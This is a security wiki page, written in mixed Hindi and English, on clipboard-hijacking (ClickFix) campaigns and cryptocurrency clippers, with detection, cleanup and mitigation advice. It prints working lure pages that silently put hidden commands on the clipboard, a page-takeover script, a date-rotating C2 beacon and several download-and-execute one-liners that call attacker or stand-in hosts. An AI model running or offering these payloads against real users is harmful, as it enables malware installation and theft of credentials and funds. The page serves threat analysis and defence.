# Clipboard Hijacking (Pastejacking) Attacks

{{#include ../../banners/hacktricks-training.md}}

> "Never paste anything you did not copy yourself." – पुरानी लेकिन अभी भी मान्य सलाह

## Overview

Clipboard hijacking – जिसे *pastejacking* भी कहा जाता है – इस तथ्य का दुरुपयोग करता है कि उपयोगकर्ता अक्सर commands को जाँच किए बिना copy-and-paste कर देते हैं। एक malicious web page (या कोई भी JavaScript-capable context जैसे Electron या Desktop application) programmatically attacker-controlled text को system clipboard में रख देता है। Victims को, आमतौर पर carefully crafted social-engineering instructions के माध्यम से, **Win + R** (Run dialog), **Win + X** (Quick Access / PowerShell) दबाने, या terminal खोलकर clipboard content *paste* करने के लिए प्रेरित किया जाता है, जिससे तुरंत arbitrary commands execute हो जाती हैं।

क्योंकि **कोई file download नहीं होती और कोई attachment open नहीं होता**, यह technique उन अधिकतर e-mail और web-content security controls से बच निकलती है जो attachments, macros या direct command execution को monitor करते हैं। इसलिए यह attack phishing campaigns में popular है, जो NetSupport RAT, Latrodectus loader या Lumma Stealer जैसे commodity malware families deliver करते हैं।

## Wallet-address replacement clippers

एक और **clipboard hijacking** variant commands paste नहीं करता: यह तब तक इंतज़ार करता है जब तक victim एक **cryptocurrency wallet address** copy न करे, फिर paste से ठीक पहले silently उसे attacker-controlled address से बदल देता है। यह लंबे wallet formats के खिलाफ विशेष रूप से effective है क्योंकि users अक्सर सिर्फ पहले/आख़िरी characters verify करते हैं।

Common real-world traits:
- **Thin loader + nested payload**: visible app/exe एक legitimate trading या "profit" tool जैसा दिखता है, जबकि असली clipper bundle के भीतर गहराई में छिपा होता है (उदाहरण के लिए .NET loader जो nested Rust payload लॉन्च करता है)।
- **Regex-driven replacement**: malware `bc1...`, `1...`, `3...`, `0x...`, `addr1...`, `DdzFF...`, `ltc...`, `T...`, `r...`, या यहाँ तक कि generic **44-character Solana-like** strings को match करता है और उन्हें attacker wallets में rewrite कर देता है।
- **Wallet rotation at scale**: modern Windows samples एक static address के बजाय प्रति currency **हज़ारों** replacement wallets embed कर सकते हैं, जिससे हर theft के बाद wallet reputation burn कम होती है।

### Windows clipper flow

एक common implementation **`AddClipboardFormatListener`** के साथ register की गई hidden window होती है। हर clipboard update पर, malware आमतौर पर ये calls करता है:
- **`OpenClipboard`** → current clipboard data access करना।
- **`GetClipboardData`** → text read करना।
- **`EmptyClipboard`** + **`SetClipboardData`** → wallet string को attacker value से replace करना।

Minimal hunting regexes जो clippers में अक्सर देखे जाते हैं:
```regex
\b(bc1)[A-Za-z0-9]{26,45}\b
\b(1)[A-Za-z0-9]{26,35}\b
\b(3)[A-Za-z0-9]{26,35}\b
\b(0x)[A-Za-z0-9]{40,46}\b
\b(addr1)[A-Za-z0-9]{26,108}\b
\b[A-Za-z0-9]{44}\b
```
User-level persistence impact के लिए पर्याप्त है। एक देखे गए pattern में शामिल है:
- payload को **`%APPDATA%\silke\silke.exe`** पर copy करें
- `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\` के तहत एक **Startup-folder LNK** बनाएं

Detection ideas:
- Processes जो clipboard APIs को लगातार call करते हैं, साथ ही `%APPDATA%` और user **Startup** folder में write भी करते हैं।
- नया LNK/executable creation जिसके बाद wallet-address clipboard rewrites हों।
- Archives या fake-software bundles जिनमें कई unused files हों, साथ में एक छोटा launcher जो nested binary start करता हो।

### macOS social-engineered quarantine removal + LaunchAgent persistence

macOS पर, कुछ campaigns एक **`unlocker.command`** helper ship करते हैं और victim को instruct करते हैं कि अगर Gatekeeper कहे कि app damaged है या unidentified developer से है, तो right-click → **Open** करें। यह script सिर्फ quarantine हटाती है और nearby `.app` को launch करती है:
```bash
/usr/bin/xattr -cr "$chosen"
/usr/bin/open "$chosen"
```
This is **not** a Gatekeeper exploit; it is a **social-engineered quarantine bypass** that abuses the fact that Gatekeeper decisions depend on the `com.apple.quarantine` xattr.

After execution, the clipper can persist as the current user by writing:
- **`~/launch.sh`** – wrapper script
- **`~/Library/LaunchAgents/com.example..plist`** – LaunchAgent with `RunAtLoad` and `KeepAlive`

A useful defensive detail is that some samples implement a **self-healing watchdog** that re-writes the LaunchAgent and wrapper every ~30 seconds. If you remove the plist first **without killing the running process**, the malware may recreate it immediately. Safe cleanup order:
1. Kill the active clipper process.
2. Unload/delete the LaunchAgent plist.
3. Delete `~/launch.sh` and the copied payload.

### Delivery note: fake reputation as a force multiplier

For this family, the malware itself can stay technically simple while the **distribution layer** does the heavy lifting: fake GitHub stars/forks, SourceForge reviews/downloads, YouTube tutorial comments/views, and benign-looking VirusTotal comments/votes are used to make the binary appear trustworthy before execution.

## Forced copy buttons and hidden payloads (macOS one-liners)

Some macOS infostealers clone installer sites (e.g., Homebrew) and **force use of a “Copy” button** so users cannot highlight only the visible text. The clipboard entry contains the expected installer command plus an appended Base64 payload (e.g., `...; echo <b64> | base64 -d | sh`), so a single paste executes both while the UI hides the extra stage.

## JavaScript Proof-of-Concept
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
पुराने campaigns में `document.execCommand('copy')` का उपयोग किया जाता था, नए वाले asynchronous **Clipboard API** (`navigator.clipboard.writeText`) पर निर्भर करते हैं।

## The ClickFix / ClearFake Flow

1. User एक typosquatted या compromised site पर जाता है (जैसे `docusign.sa[.]com`)
2. Injected **ClearFake** JavaScript `unsecuredCopyToClipboard()` helper को कॉल करता है, जो चुपचाप clipboard में Base64-encoded PowerShell one-liner स्टोर कर देता है।
3. HTML instructions victim को बताते हैं: *“Press **Win + R**, command paste करें और issue resolve करने के लिए Enter press करें।”*
4. `powershell.exe` execute होता है, एक archive download करता है जिसमें एक legitimate executable और एक malicious DLL होता है (classic DLL sideloading).
5. Loader additional stages decrypt करता है, shellcode inject करता है और persistence install करता है (जैसे scheduled task) – अंततः NetSupport RAT / Latrodectus / Lumma Stealer चलाता है।

### Example NetSupport RAT Chain
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (legitimate Java WebStart) अपनी directory में `msvcp140.dll` खोजता है।
* malicious DLL **GetProcAddress** के साथ APIs को dynamically resolve करती है, **curl.exe** के जरिए दो binaries (`data_3.bin`, `data_4.bin`) डाउनलोड करती है, उन्हें rolling XOR key `"https://google.com/"` का उपयोग करके decrypt करती है, final shellcode inject करती है और **client32.exe** (NetSupport RAT) को `C:\ProgramData\SecurityCheck_v1\` में unzip करती है।

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. **curl.exe** के साथ `la.txt` डाउनलोड करता है
2. **cscript.exe** के अंदर JScript downloader को execute करता है
3. MSI payload fetch करता है → एक signed application के पास `libcef.dll` drop करता है → DLL sideloading → shellcode → Latrodectus.

### Lumma Stealer via MSHTA
```
mshta https://iplogger.co/xxxx =+\\xxx
```
**mshta** call एक hidden PowerShell script लॉन्च करता है, जो `PartyContinued.exe` को retrieve करता है, `Boat.pst` (CAB) extract करता है, `extrac32` और file concatenation के जरिए `AutoIt3.exe` को reconstruct करता है, और अंत में एक `.a3x` script चलाता है, जो browser credentials को `sumeriavgv.digital` पर exfiltrate करता है।

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK with rotating C2 (PureHVNC)

कुछ ClickFix campaigns file downloads को पूरी तरह skip कर देते हैं और victims को एक one-liner paste करने के लिए instruct करते हैं, जो WSH के जरिए JavaScript fetch और execute करता है, उसे persist करता है, और C2 को daily rotate करता है। Example observed chain:
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
मुख्य विशेषताएँ
- Obfuscated URL को runtime पर उल्टा किया जाता है ताकि casual inspection को हराया जा सके।
- JavaScript खुद को Startup LNK (WScript/CScript) के माध्यम से persist करता है, और current day के आधार पर C2 चुनता है — जिससे rapid domain rotation संभव होती है।

तारीख के आधार पर C2s को rotate करने के लिए इस्तेमाल किया गया minimal JS fragment:
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
अगला चरण आमतौर पर एक loader तैनात करता है जो persistence स्थापित करता है और एक RAT (जैसे, PureHVNC) खींचता है, अक्सर TLS को hardcoded certificate पर pin करके और traffic को chunk करके।

इस variant के लिए विशिष्ट detection ideas
- Process tree: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (या `cscript.exe`).
- Startup artifacts: `LNK` in `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` invoking WScript/CScript with a JS path under `%TEMP%`/`%APPDATA%`.
- Registry/RunMRU and command-line telemetry containing `.split('').reverse().join('')` or `eval(a.responseText)`.
- Repeated `powershell -NoProfile -NonInteractive -Command -` with large stdin payloads to feed long scripts without long command lines.
- Scheduled Tasks that subsequently execute LOLBins such as `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` under an updater‑looking task/path (e.g., `\GoogleSystem\GoogleUpdater`).

Threat hunting
- Daily‑rotating C2 hostnames and URLs with `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>` pattern.
- Correlate clipboard write events followed by Win+R paste then immediate `powershell.exe` execution.


Blue-teams clipboard, process-creation और registry telemetry को मिलाकर pastejacking abuse को pinpoint कर सकते हैं:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` **Win + R** commands का history रखता है – असामान्य Base64 / obfuscated entries देखें।
* Security Event ID **4688** (Process Creation) जहाँ `ParentImage` == `explorer.exe` और `NewProcessName` in { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
* Event ID **4663** `%LocalAppData%\Microsoft\Windows\WinX\` या temporary folders में file creations के लिए, suspicious 4688 event से ठीक पहले।
* EDR clipboard sensors (if present) – `Clipboard Write` के तुरंत बाद एक नया PowerShell process correlate करें।

## IUAM-style verification pages (ClickFix Generator): clipboard copy-to-console + OS-aware payloads

Recent campaigns fake CDN/browser verification pages ("Just a moment…", IUAM-style) को बड़े पैमाने पर बनाते हैं जो users को clipboard से OS-specific commands native consoles में copy करने के लिए मजबूर करती हैं। यह execution को browser sandbox से बाहर ले जाता है और Windows तथा macOS दोनों पर काम करता है।

Builder-generated pages की मुख्य विशेषताएँ
- `navigator.userAgent` के माध्यम से OS detection ताकि payloads को tailor किया जा सके (Windows PowerShell/CMD vs. macOS Terminal). Unsupported OS के लिए optional decoys/no-ops, illusion बनाए रखने हेतु।
- Benign UI actions (checkbox/Copy) पर automatic clipboard-copy, जबकि visible text clipboard content से अलग हो सकता है।
- Mobile blocking और step-by-step instructions वाला popover: Windows → Win+R→paste→Enter; macOS → Terminal खोलें→paste→Enter।
- Optional obfuscation और single-file injector जो compromised site के DOM को Tailwind-styled verification UI से overwrite करता है (नई domain registration की आवश्यकता नहीं)।

Example: clipboard mismatch + OS-aware branching
```html
<div class="space-y-2">
<label class="inline-flex items-center space-x-2">
<input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
</label>
<div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
// UI shows a harmless string, but clipboard gets the real command
navigator.clipboard.writeText(real).then(()=>{
document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
});
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```
macOS persistence of the initial run
- `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &` का उपयोग करें ताकि टर्मिनल बंद होने के बाद भी execution जारी रहे, और visible artifacts कम हों।

compromised sites पर in-place page takeover
```html
<script>
(async () => {
const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
document.documentElement.innerHTML = html;                 // overwrite DOM
const s = document.createElement('script');
s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
document.head.appendChild(s);
})();
</script>
```
- IUAM-style lures के लिए विशिष्ट Detection & hunting ideas
- Web: ऐसे pages जो Clipboard API को verification widgets से bind करते हैं; displayed text और clipboard payload के बीच mismatch; `navigator.userAgent` branching; suspicious contexts में Tailwind + single-page replace।
- Windows endpoint: `explorer.exe` → `powershell.exe`/`cmd.exe` browser interaction के तुरंत बाद; `%TEMP%` से executed batch/MSI installers।
- macOS endpoint: Terminal/iTerm का `bash`/`curl`/`base64 -d` को `nohup` के साथ browser events के पास spawn करना; terminal close होने के बाद भी background jobs का surviving रहना।
- `RunMRU` Win+R history और clipboard writes को subsequent console process creation के साथ correlate करें।

Support करने वाली techniques के लिए भी देखें

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## 2026 fake CAPTCHA / ClickFix evolutions (ClearFake, Scarlet Goldfinch)

- ClearFake अभी भी WordPress sites को compromise करता है और loader JavaScript inject करता है जो external hosts (Cloudflare Workers, GitHub/jsDelivr) और यहाँ तक कि blockchain “etherhiding” calls (e.g., POSTs to Binance Smart Chain API endpoints such as `bsc-testnet.drpc[.]org`) को chain करके current lure logic pull करता है। Recent overlays में heavily fake CAPTCHAs का उपयोग होता है जो users को कुछ डाउनलोड करने के बजाय एक one-liner copy/paste करने को कहते हैं (T1204.004)।
- Initial execution increasingly signed script hosts/LOLBAS को delegate की जा रही है। January 2026 chains ने earlier `mshta` usage को built-in `SyncAppvPublishingServer.vbs` से replace किया, जिसे `WScript.exe` के via execute किया गया, और remote content fetch करने के लिए aliases/wildcards के साथ PowerShell-like arguments pass किए गए:
```cmd
"C:\WINDOWS\System32\WScript.exe" "C:\WINDOWS\system32\SyncAppvPublishingServer.vbs" "n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr[.]net/gh/grading-chatter-dock73/vigilant-bucket-gui/p1lot')"
```
- `SyncAppvPublishingServer.vbs` साइन किया हुआ है और सामान्यतः App-V द्वारा इस्तेमाल किया जाता है; `WScript.exe` और असामान्य arguments (`gal`/`gcm` aliases, wildcarded cmdlets, jsDelivr URLs) के साथ मिलकर यह ClearFake के लिए एक high-signal LOLBAS stage बन जाता है।
- फरवरी 2026 fake CAPTCHA payloads फिर से pure PowerShell download cradles पर शिफ्ट हो गए। दो live examples:
```powershell
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -c iex(irm 158.94.209[.]33 -UseBasicParsing)
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -w h -c "$w=New-Object -ComObject WinHttp.WinHttpRequest.5.1;$w.Open('GET','https[:]//cdn[.]jsdelivr[.]net/gh/www1day7/msdn/fase32',0);$w.Send();$f=$env:TEMP+'\FVL.ps1';$w.ResponseText>$f;powershell -w h -ep bypass -f $f"
```
- पहला chain एक in-memory `iex(irm ...)` grabber है; दूसरा `WinHttp.WinHttpRequest.5.1` के जरिए stage होता है, एक temp `.ps1` लिखता है, फिर `-ep bypass` के साथ hidden window में launch करता है।

इन variants के लिए detection/hunting tips
- Process lineage: browser → `explorer.exe` → `wscript.exe ...SyncAppvPublishingServer.vbs` या clipboard writes/Win+R के तुरंत बाद PowerShell cradles।
- Command-line keywords: `SyncAppvPublishingServer.vbs`, `WinHttp.WinHttpRequest.5.1`, `-UseBasicParsing`, `%TEMP%\FVL.ps1`, jsDelivr/GitHub/Cloudflare Worker domains, या raw IP `iex(irm ...)` patterns।
- Network: script hosts/PowerShell से web browsing के तुरंत बाद CDN worker hosts या blockchain RPC endpoints की outbound requests।
- File/registry: `%TEMP%` के under temporary `.ps1` creation plus RunMRU entries जिनमें ये one-liners हों; signed-script LOLBAS (WScript/cscript/mshta) के external URLs या obfuscated alias strings के साथ executing पर block/alert करें।

## June 2026 ClickFix tradecraft: paste telemetry, fake verification comments, and LOLBin chaining

Recent Red Canary telemetry दिखाता है कि stable indicator **एक exact command नहीं**, बल्कि **user-assisted paste-and-run**, **trusted interpreters/LOLBins**, **obfuscated flags**, **remote retrieval**, और **immediate execution** का combination है।

### Notable operator patterns

- **Paste confirmation telemetry**: कुछ payloads `curl -fsS -4 --connect-timeout 5 --max-time 10 -X POST ... /api/metrics/run?event=pasted` को real stage से पहले call करते हैं। यह user interaction की पुष्टि करता है जबकि window short और quiet रहती है।
- **Fake verification comments**: PowerShell one-liners `# Security check ✔️ I'm not a robot Verification ID: 138105` जैसे strings append कर सकते हैं, ताकि command paste होने के बाद भी Run / `cmd.exe` / PowerShell history में CAPTCHA-related लगे।
- **Dynamic URL reconstruction**: `iex(irm(('ccud'+'mcx')+('.x'+'yz/u')))` command line में static URL से बचता है, जबकि in-memory download-and-execute करता है।
- **Masqueraded installer execution**: `"C:\WINDOWS\system32\msIeXec.exe" -PAcKᵃGE http://... /Q` unusual casing और flags में Unicode-like characters का abuse करता है ताकि brittle detections टूटें, लेकिन `msiexec.exe` जैसा लगे।
- **Caret-escaped LOLBin chains**: `cmd.exe` `^` escapes (`s^t^a^r^t`, `^c^u^r^l^`, `^m^s^h^t^a^`) से keywords hide कर सकता है, nested shell को minimized start कर सकता है, attacker content को `.pdf` जैसी benign extension में save कर सकता है, और फिर `mshta` के जरिए execute कर सकता है।
## Mitigations

1. Browser hardening – clipboard write-access (`dom.events.asyncClipboard.clipboardItem` etc.) disable करें या user gesture require करें।
2. Security awareness – users को sensitive commands *type* करना सिखाएँ या पहले उन्हें text editor में paste करने को कहें।
3. PowerShell Constrained Language Mode / Execution Policy + Application Control से arbitrary one-liners block करें।
4. Network controls – known pastejacking और malware C2 domains की outbound requests block करें।

## Related Tricks

* **Discord Invite Hijacking** अक्सर उसी ClickFix approach का abuse करता है, जब users को malicious server में lure किया जाता है:

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## References

- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [The ClickFix Factory: First Exposure of IUAM ClickFix Generator](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
- [2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [Red Canary – Intelligence Insights: February 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-february-2026/)
- [Red Canary – Intelligence Insights: June 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-june-2026/)
- [Check Point Research – From Stars to Upvotes: Fake Reputation Fueling a Crypto Clipboard Hijacker](https://research.checkpoint.com/2026/from-stars-to-upvotes-fake-reputation-fueling-a-crypto-clipboard-hijacker/)

{{#include ../../banners/hacktricks-training.md}}
